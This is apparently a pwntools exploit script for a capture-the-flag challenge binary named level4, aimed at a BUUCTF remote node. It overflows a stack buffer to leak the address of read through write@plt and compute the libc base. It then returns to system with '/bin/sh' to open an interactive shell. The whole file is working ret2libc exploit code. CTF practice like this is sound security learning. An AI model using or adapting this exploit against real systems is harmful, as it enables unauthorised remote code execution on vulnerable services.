from pwn import *
import sys
remote_addr = ["node4.buuoj.cn",27891]
libc = ELF('./libc-2.23.so')
elf = ELF('./level4')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./level4")
    context(arch='i386', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

#debug()

write_plt = elf.plt['write']
read_got = elf.got['read']
main = 0x804844b

payload = b'a' * (0x88 + 4) + p32(write_plt) + p32(main) + p32(1) + p32(read_got) + p32(4)
s(payload)
libc.address = u32(rc(4)) - libc.sym['read']
pr('libc.address', libc.address)

system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))

payload = b'a' * (0x88 + 4) + p32(system) + p32(main) + p32(binsh)
s(payload)

shell()
